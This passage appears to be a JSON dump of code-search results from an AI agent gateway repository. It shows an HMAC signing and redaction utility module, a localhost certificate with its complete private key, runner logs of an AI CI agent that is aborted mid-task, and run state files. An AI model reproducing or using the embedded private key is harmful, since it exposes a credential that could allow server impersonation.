expect(result).not.toContain('secret123');\n  });\n});", "metadata": {"file": "gateway/src/utils/crypto.test.ts", "start_line": 201, "end_line": 207, "language": "ts"}}, {"corpus": "code", "source": "gateway/src/utils/crypto.ts", "location": "gateway/src/utils/crypto.ts:1", "score": 0.0, "content": "import { createHmac, createHash, randomBytes, timingSafeEqual } from 'crypto';\nimport { config } from '../config.js';\n\nexport interface SignatureComponents {\n  method: string;\n  path: string;\n  bodyHash: string;\n  timestamp: number;\n  nonce: string;\n  runId?: string;\n  capabilityToken?: string;\n}\n\n/**\n * Create HMAC signature for wrapper authentication\n */\nexport function createSignature(components: SignatureComponents, secret: string = config.hmacSecret): string {\n  const message = [\n    components.method.toUpperCase(),\n    components.path,\n    components.bodyHash,\n    components.timestamp.toString(),\n    components.nonce,\n    components.runId || '',\n    components.capabilityToken || ''\n  ].join('\\n');\n\n  return createHmac('sha256', secret).update(message).digest('hex');\n}\n\n/**\n * Verify HMAC signature\n */\nexport function verifySignature(\n  signature: string,\n  components: SignatureComponents,\n  secret: string = config.hmacSecret\n): boolean {\n  const expected = createSignature(components, secret);\n\n  // Use timing-safe comparison\n  try {\n    return timingSafeEqual(Buffer.from(signature, 'hex'), Buffer.from(expected, 'hex'));\n  } catch {\n    return false;\n  }\n}\n\n/**\n * Hash body content\n */\nexport function hashBody(body: string | Buffer): string {\n  return createHash('sha256').update(body).digest('hex');\n}\n\n/**\n * Generate random nonce\n */\nexport function generateNonce(): string {\n  return randomBytes(16).toString('hex');\n}\n\n/**\n * Generate capability token for a run\n */\nexport function generateCapabilityToken(): string {\n  return randomBytes(32).toString('hex');\n}\n\n/**\n * Generate session token\n */\nexport function generateSessionToken(): string {\n  return randomBytes(48).toString('hex');\n}\n\n/**\n * Check if timestamp is within allowed clock skew\n */\nexport function isTimestampValid(timestamp: number): boolean {\n  const now = Math.floor(Date.now() / 1000);\n  const diff = Math.abs(now - timestamp);\n  return diff <= config.clockSkewSeconds;\n}\n\n/**\n * Redact secrets from text\n */\nexport function redactSecrets(text: string): string {\n  let result = text;\n  for (const pattern of config.secretPatterns) {\n    result = result.replace(pattern, '[REDACTED]');\n  }\n  return result;\n}", "metadata": {"file": "gateway/src/utils/crypto.ts", "start_line": 1, "end_line": 95, "language": "ts"}}, {"corpus": "code", "source": ".data/certs/server.crt", "location": ".data/certs/server.crt:1", "score": 0.0, "content": "-----BEGIN CERTIFICATE-----\nMIIDpzCCAo+gAwIBAgIUMP9pudlvFugFDFok3H5LekIIQ7cwDQYJKoZIhvcNAQEL\nBQAwVTELMAkGA1UEBhMCVVMxDDAKBgNVBAgMA0RldjEMMAoGA1UEBwwDRGV2MRYw\nFAYDVQQKDA1BaVJlbW90ZUNvZGVyMRIwEAYDVQQDDAlsb2NhbGhvc3QwHhcNMjYw\nMTI4MjAyNDMzWhcNMjcwMTI4MjAyNDMzWjBVMQswCQYDVQQGEwJVUzEMMAoGA1UE\nCAwDRGV2MQwwCgYDVQQHDANEZXYxFjAUBgNVBAoMDUFpUmVtb3RlQ29kZXIxEjAQ\nBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB\nAKYd26K7gH2zK2q7Z8WRz4Pwpc34AufFQD9VNeJp49os8avP64kE60WdkcicOY5B\nlsZi7gMJDCbRRkAxaQDq4vsT2hH4DYqDmcAetJl0ioRdBS4hd1E0onO3GCY4Fggo\n98re8WfsbrTbiCZB5ySoNQvZaU61XICN5nfMdqoov5FP7JL0Pk7v0lJoTjMwWhuV\nvhH3qN6IDw6hbfCPlkI6ZuSpCrsnWhmbONPTW45x+S+N4P5uMPuUD/tzVYw7cIht\n+qD4XgawfK36l4VjQKOhzEcCNNm96NP6+mxDDbPnUxi9/grNGSuLecz2Qdvv5ogF\nQv32zit3DNA/ggGGA1wwwpECAwEAAaNvMG0wHQYDVR0OBBYEFF9pg8IlR3qQaUUf\nJydugn9//BAEMB8GA1UdIwQYMBaAFF9pg8IlR3qQaUUfJydugn9//BAEMA8GA1Ud\nEwEB/wQFMAMBAf8wGgYDVR0RBBMwEYIJbG9jYWxob3N0hwR/AAABMA0GCSqGSIb3\nDQEBCwUAA4IBAQA2ylhLZNmcH8AtbeaiQBDJSrxJ9Zcc2FeMUEDT+5iK3M+AUFYO\n/+Oux0bz3E7Kwu3p5oV5lB/EbxWIq60OZBBYlHATOAgRaQ+GXQUIAIPs1rqhKyt2\nu3ntGLQla7kUCVmBY3+6NxZsZ433abqXTcLffFcecNR5LJGsDCnMbeqvpXXOWILb\nR317IswJyxjTfYeD1ctpUo7UppvZcqlH3OHOAcb8pUixDy1gJyX6D9gFMREU3K2D\n+9oQxMG+p17UUcMOhrEvEEdKrYN+D4ft5/e+lxzApHLxtP4dRn/YTzfr3vM19vhO\nYVbY4zMPlHQ7bTgeXu10y408UyOFQG//F+e1\n-----END CERTIFICATE-----", "metadata": {"file": ".data/certs/server.crt", "start_line": 1, "end_line": 22, "language": "crt"}}, {"corpus": "code", "source": ".data/certs/server.key", "location": ".data/certs/server.key:1", "score": 0.0, "content": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCmHduiu4B9sytq\nu2fFkc+D8KXN+ALnxUA/VTXiaePaLPGrz+uJBOtFnZHInDmOQZbGYu4DCQwm0UZA\nMWkA6uL7E9oR+A2Kg5nAHrSZdIqEXQUuIXdRNKJztxgmOBYIKPfK3vFn7G6024gm\nQeckqDUL2WlOtVyAjeZ3zHaqKL+RT+yS9D5O79JSaE4zMFoblb4R96jeiA8OoW3w\nj5ZCOmbkqQq7J1oZmzjT01uOcfkvjeD+bjD7lA/7c1WMO3CIbfqg+F4GsHyt+peF\nY0CjocxHAjTZvejT+vpsQw2z51MYvf4KzRkri3nM9kHb7+aIBUL99s4rdwzQP4IB\nhgNcMMKRAgMBAAECggEAAQjiuNJDYQYYJ+uo9utYnVL6jMSnehuSeBgy61R/w6H0\nBN4KoCoAm3PkxG+aCPurbX1zomN64qF/OTG8TgzLmN/JkFe37768inExXAh4JnE5\nFNX0WhMt0N36VD+VM98uKlY2LzO/+4ZM1M/Z+G5k685q0k3v4Nlnnll+PpnAruHm\nlbLsTd14unpLOz3dty4+DjPU4r0nHkAiWUgYSEvXAXiktFs2/9QSaZ5q7+Yer3KN\nJyROQhjgTBRwchxjwmLeaJ/xizj/mfp+qq7+ojRklufNjj+Rp9ar0kdpNfoVFYqG\nQR8XjvO4IYxdSMwq/Tfz1IWhYEiiDdDANqiL3Z8jLQKBgQDmST4nWSr3QM9O1Crj\nFHZRMpJT5G4aKxvBCZmt2ZmBTb3TNkvb0rd9HhiM7qiedwj6ZorQjBv40pPtyuyb\nB6DDVSXA56VIwJGaP6IM7/Oi3WEv6sXruenNHU6zWRGSmI5jGyxt8iqEpBTmMht4\nGhFAGwcvaYrditAQnelpxwVGjQKBgQC4qlKfw4XXui1CpHvw3xrOdY4HctE+wHph\ndAa77Sv3vNEAGa0XWiYh3vPlMFyfkLShUUHi2wlUPr/UxWbEGsojY6efELcG1HZb\nIclWbrIwq4Ic1oORLz6rRhRodE/yG2pF0yUGNZQWGkW5yofMjY7aaHDA8ZZ7ltcQ\n3Cngz9QdFQKBgELz3Hw4MoO8dglnKijnVBb7awu1CEXXbrRLBEFFWJn9bkkwKhH5\nS5u22lBvOtsHpLaYhZdohOFs59FlBDF2oEjqQpW5Q5bJVgvQoF6+jMk3MABsc6q7\nXLxj3vPJ25ARhqRNzDcTB0WVJvZebxoWChnnQcmJF/SdXSzXnHtCf8gpAoGAFoTu\nvnzhfYU+r7nPQ3hxlGvRficKTVS7l9bGW3R4wCVOd2yqJwbfT5IYvAJByVOkM2ft\nWPTNFnDwg8nu1ktOCzLD5inrp/GQ3VwpaVjmcfj4TPv732Cbi9dn9bT5atTdCNbO\n1QsDnA5oIlgIZ3F70jaaSW0spLWoVG4EzV2KyGECgYB8sTDMrmiYhW5QaHy6wUGd\nYaR+VHuVznkUs3BLvEFeuSk/AT7jlokKXYhqn3/zHxKxvpTx6ATpQ86tQ248URp3\nTjCCLb4hCpLKuQ5tw06tekbOgSprZ+Vz/dT+mZQLXdlRzEHNTu6mLrCiaEEjKS9r\n8X1QoRnG/ZLF//dXt6EHow==\n-----END PRIVATE KEY-----", "metadata": {"file": ".data/certs/server.key", "start_line": 1, "end_line": 28, "language": "key"}}, {"corpus": "code", "source": ".data/runs/E50nPDAhjnM_/runner.log", "location": ".data/runs/E50nPDAhjnM_/runner.log:1", "score": 0.0, "content": "[stdout] [OK] Tool mode set to: normal\nworkspace_root=C:\\Users\\TimShelton\\source\\repos\\VisualSynth\nallowed_roots=['C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth']\nrun_log=C:\\Users\\TimShelton\\source\\repos\\VisualSynth\\.rev\\logs\\rev_run_20260128_153619.log\n\n[TRUST NOTICE] This is the first time rev is running in this workspace.\nrev can read/write files under the workspace root and execute shell commands.\nEnsure you trust the contents of this project before proceeding.\nTip: rerun with --trust-workspace or set REV_TRUST_ACCEPT=1 to skip this notice in the future.\n[mcp] enabled; servers registered: cloudflare-docs, deepwiki, exa-search, fetch, llmtext, memory, remote-fetch, semgrep, sequential-thinking\n[tools] total available: 98\nrev - CI/CD Agent\nProvider: ollama\nModel: qwen3-vl:235b-instruct-cloud\nOllama: http://localhost:11434\nRepository: C:\\Users\\TimShelton\\source\\repos\\VisualSynth\n  [i] Autonomous mode: destructive operations will prompt for confirmation\n\n\n\n1. READ ./vitest.config.ts to understand the current test configuration and identify gaps in test coverage setup\nResearchAgent executing task: ./vitest.config.ts to understand the current test configuration and identify gaps in test coverage setup\n  -> ResearchAgent will call tool 'read_file' with arguments: {'path': 'vitest.config.ts'}\n\n\n\n\n2. READ tests/ to identify existing test files and determine which source files lack corresponding test coverage\nResearchAgent executing task: tests/ to identify existing test files and determine which source files lack corresponding test coverage\n\n============================================================\n  EXECUTION INTERRUPTED\n============================================================\n\n\nTo load this session and continue manually:\n\n  rev --resume C:\\Users\\TimShelton\\source\\repos\\VisualSynth\\.rev\\checkpoints\\checkpoint_32fddd590a2b4d6596a8056b3c167a64_0002_20260128_153632_806.json\n\nTo continue the prior plan immediately:\n\n  rev --resume C:\\Users\\TimShelton\\source\\repos\\VisualSynth\\.rev\\checkpoints\\checkpoint_32fddd590a2b4d6596a8056b3c167a64_0002_20260128_153632_806.json --resume-continue\n\nOr to use the latest checkpoint:\n\n  rev --resume\n  rev --resume --resume-continue\n\nToken Usage:\n  Total: 4,261\n  Prompt: 4,196\n  Completion: 65\n\n============================================================\n\n\nAborted by user\n[stdout] [OK] Tool mode set to: normal\nworkspace_root=C:\\Users\\TimShelton\\source\\repos\\VisualSynth\nallowed_roots=['C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth']\nrun_log=C:\\Users\\TimShelton\\source\\repos\\VisualSynth\\.rev\\logs\\rev_run_20260128_153657.log\n\n[TRUST NOTICE] This is the first time rev is running in this workspace.\nrev can read/write files under the workspace root and execute shell commands.\nEnsure you trust the contents of this project before proceeding.\nTip: rerun with --trust-workspace or set REV_TRUST_ACCEPT=1 to skip this notice in the future.\n[mcp] enabled; servers registered: cloudflare-docs, deepwiki, exa-search, fetch, llmtext, memory, remote-fetch, semgrep, sequential-thinking\n[tools] total available: 98\nrev - CI/CD Agent\nProvider: ollama\nModel: qwen2.5-coder:7b\nOllama: http://localhost:11434\nRepository: C:\\Users\\TimShelton\\source\\repos\\VisualSynth\n  [i] Autonomous mode: destructive operations will prompt for confirmation\n\n\n\n1. READ Review the current test coverage report in the AUDIT_REPORT.md file\nResearchAgent executing task: Review the current test coverage report in the AUDIT_REPORT.md file\n  -> ResearchAgent will call tool 'read_file' with arguments: {'path': 'AUDIT_REPORT.md'}\n\n\n\n\n\n2. READ review the `AUDIT_REPORT.md` for recommendations and prioritize the critical refactorings mentioned.\nResearchAgent executing task: review the `AUDIT_REPORT.md` for recommendations and prioritize the critical refactorings mentioned.\n  -> ResearchAgent will call tool 'read_file' with arguments: {'path': 'AUDIT_REPORT.md'}\n\n\n\n\n\n3. TOOL run `split_python_module_classes` on src/renderer/index.ts to split the file into smaller, more manageable modules.\n\n\n\n4. READ Inspect and locate the invalid decimal literal in `src/renderer/index.ts` on line 666 to resolve the parsing error.\nResearchAgent executing task: Inspect and locate the invalid decimal literal in `src/renderer/index.ts` on line 666 to resolve the parsing error.\n  -> ResearchAgent will call tool 'read_file_lines' with arguments: {'path': 'src/renderer/index.ts', 'start': 665, 'end': 667}\n\n\n\n\n5. REFACTOR Split the `src/renderer/index.ts` file into smaller, more manageable modules by creating new files for each feature area (e.g., UI components, state management, rendering logic) and refactoring the code accordingly.\n  -> RefactoringAgent will call tool 'read_file'\n    Arguments: {\n  \"path\": \"src/renderer/index.ts\"\n}...\n\n\n\n6. CREATE_TOOL Develop a custom tool `split_large_module` that can parse TypeScript files and split them into smaller modules based on logical features rather than just size. This tool should be able to handle syntax errors like invalid decimal literals gracefully and provide feedback for manual intervention if needed.\n  -> ToolCreationAgent will call tool 'write_file' with arguments: {'file_path': '.rev/tools/split_large_module.py', 'content': 'from typing import Dict, Any\\n\\ndef split_large_module(file_path: str) -> Dict[str, Any]:\\n    \"\"\"Parse TypeScript file and split into smaller modules based on logical features.\\n\\n    Args:\\n        file_path: Path to file to analyze\\n\\n    Returns:\\n        Dictionary containing the tool\\'s results.\\n\\n    Raises:\\n        ValueError: If parameters are invalid\\n    \"\"\"\\n    try:\\n        with open(file_path, \\'r\\') as file:\\n            content = file.read()\\n\\n        # Placeholder for logic to split the module\\n        modules = []\\n        current_module = {\\n            \\'name\\': \\'module1\\',\\n            \\'content\\': \\'\\'\\n        }\\n\\n        lines = content.splitlines()\\n        for line in lines:\\n            if \\'//\\' in line or \\'/*\\' in line or \\'*/\\' in line:\\n                continue\\n            current_module[\\'content\\'] += line + \\'\\\\n\\'\\n            if \\'export\\' in line or \\'import\\' in line or \\'}\\' in line:\\n                modules.append(current_module)\\n                current_module = {\\n                    \\'name\\': f\\'module{len(modules) + 1}\\',\\n                    \\'content\\': \\'\\'\\n                }\\n\\n        return {\\n            \"status\": \"success\",\\n            \"data\": modules\\n        }\\n    except Exception as e:\\n        return {\\n            \"status\": \"error\",\\n            \"message\": str(e)\\n        }'}\n\n  [WARN] Exception in ToolCreationAgent: cannot use 'dict' as a set element (unhashable type: 'dict')\n  -> Requesting replan due to exception (attempt 1/2)...\n  [retry_reason] exception: cannot use 'dict' as a set element (unhashable type: 'dict')\n\n\n\n7. READ Inspect and analyze the error in the custom tool creation process to identify the root cause of the \"exception: cannot use 'dict' as a set element (unhashable type: 'dict')\" error.\nResearchAgent executing task: Inspect and analyze the error in the custom tool creation process to identify the root cause of the \"exception: cannot use 'dict' as a set element (unhashable type: 'dict')\" error.\n  -> ResearchAgent will call tool 'read_file_lines' with arguments: {'path': 'src/renderer/index.ts', 'start': 664, 'end': 670}\n\n\n\n\n8. TOOL Execute the custom tool `split_large_module` on `src/renderer/index.ts` with parameters to split it into smaller modules based on logical features. Ensure the tool handles syntax errors like invalid decimal literals gracefully and provides feedback for manual intervention if needed.\n\n\n\n9. RETRY Develop a custom tool `split_large_module` that can parse TypeScript files and split them into smaller modules based on logical features rather than just size. This tool should be able to handle syntax errors like invalid decimal literals gracefully and provide feedback for manual intervention if needed.\n\n\n10. READ Inspect the error logs for the \"Server not found: code_review_server\" error encountered during the execution of the custom tool. Identify any misconfigurations or network issues that might be causing the server to be unreachable.\nResearchAgent executing task: Inspect the error logs for the \"Server not found: code_review_server\" error encountered during the execution of the custom tool. Identify any misconfigurations or network issues that might be causing the server to be unreachable.\n  -> ResearchAgent will call tool 'read_file' with arguments: {'path': '.rev/logs/rev_run_20260126_213412.log'}\n\n\n\n\nRequest cancelled by user (Ctrl+C)\n\n============================================================\n  EXECUTION INTERRUPTED\n============================================================\n\n\nTo load this session and continue manually:\n\n  rev --resume C:\\Users\\TimShelton\\source\\repos\\VisualSynth\\.rev\\checkpoints\\checkpoint_acc9887d712241668ffd76c78ddb4ca5_0011_20260128_155123_088.json\n\nTo continue the prior plan immediately:\n\n  rev --resume C:\\Users\\TimShelton\\source\\repos\\VisualSynth\\.rev\\checkpoints\\checkpoint_acc9887d712241668ffd76c78ddb4ca5_0011_20260128_155123_088.json --resume-continue\n\nOr to use the latest checkpoint:\n\n  rev --resume\n  rev --resume --resume-continue\n\nToken Usage:\n  Total: 36,597\n  Prompt: 35,508\n  Completion: 1,089\n\n============================================================\n\n\nAborted by user", "metadata": {"file": ".data/runs/E50nPDAhjnM_/runner.log", "start_line": 1, "end_line": 171, "language": "log"}}, {"corpus": "code", "source": ".data/runs/E50nPDAhjnM_/state.json", "location": ".data/runs/E50nPDAhjnM_/state.json:1", "score": 0.0, "content": "{\n  \"runId\": \"E50nPDAhjnM_\",\n  \"sequence\": 4,\n  \"workingDir\": \"C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth\",\n  \"autonomous\": false,\n  \"workerType\": \"rev\",\n  \"savedAt\": 1769637083180\n}", "metadata": {"file": ".data/runs/E50nPDAhjnM_/state.json", "start_line": 1, "end_line": 8, "language": "json"}}, {"corpus": "code", "source": ".data/runs/kKgpxZT5ra37/runner.log", "location": ".data/runs/kKgpxZT5ra37/runner.log:1", "score": 0.0, "content": "[stderr] ^C[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2819 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2819 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u283c \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u283c \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u283c \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u283c \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2807 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2807 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2819 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u283c \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u283c \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2819 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2819 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2807 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2827 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2807 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280f \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u280b \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2819 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2839 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2838 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2834 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2826 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?2026h\u001b[?25l\u001b[1G\u2807 \u001b[K\u001b[?25h\u001b[?2026l[stderr] \u001b[?25l\u001b[?2026h\u001b[?25l\u001b[1G\u001b[K\u001b[?25h\u001b[?2026l\u001b[2K\u001b[1G\u001b[?25h[stdout] Ens[stderr] \u001b[?25l\u001b[?25h[stdout] uring[stderr] \u001b[?25l\u001b[?25h[stdout]  a[stderr] \u001b[?25l\u001b[?25h[stdout]  reliable[stderr] \u001b[?25l\u001b[?25h[stdout]  app[stderr] \u001b[?25l\u001b[?25h[stdout]  through[stderr] \u001b[?25l\u001b[?25h[stdout]  comprehensive[stdout] \n\n[stderr] \u001b[?25l\u001b[?25h", "metadata": {"file": ".data/runs/kKgpxZT5ra37/runner.log", "start_line": 1, "end_line": 3, "language": "log"}}, {"corpus": "code", "source": ".data/runs/kKgpxZT5ra37/state.json", "location": ".data/runs/kKgpxZT5ra37/state.json:1", "score": 0.0, "content": "{\n  \"runId\": \"kKgpxZT5ra37\",\n  \"sequence\": 109,\n  \"workingDir\": \"C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth\",\n  \"autonomous\": false,\n  \"workerType\": \"ollama\",\n  \"model\": \"qwen2.5-coder:7b\",\n  \"savedAt\": 1769637973677\n}", "metadata": {"file": ".data/runs/kKgpxZT5ra37/state.json", "start_line": 1, "end_line": 9, "language": "json"}}, {"corpus": "code", "source": ".data/runs/ldi13C4FY_Si/runner.log", "location": ".data/runs/ldi13C4FY_Si/runner.log:1", "score": 0.0, "content": "[stderr] \nLaunching Claude Code with qwen2.5-coder:7b...", "metadata": {"file": ".data/runs/ldi13C4FY_Si/runner.log", "start_line": 1, "end_line": 2, "language": "log"}}, {"corpus": "code", "source": ".data/runs/ldi13C4FY_Si/state.json", "location": ".data/runs/ldi13C4FY_Si/state.json:1", "score": 0.0, "content": "{\n  \"runId\": \"ldi13C4FY_Si\",\n  \"sequence\": 4,\n  \"workingDir\": \"C:\\\\Users\\\\TimShelton\\\\source\\\\repos\\\\VisualSynth\",\n  \"autonomous\": false,\n  \"workerType\": \"ollama-launch\",\n  \"model\": \"qwen2.5-coder:7b\",\n  \"savedAt\": 1769642250964\n}", "metadata": {"file": ".data/runs/ldi13C4FY_Si/state.json", "start_line": 1, "end_line": 9, "language": "json"}}, {"corpus": "code", "source": ".data/runs/PMWnfTuHA-JJ/runner.log", "location": ".data/runs/PMWnfTuHA-JJ/runner.log:1", "score": 0.0, "content": "[stderr] ^C", "metadata": {"file": 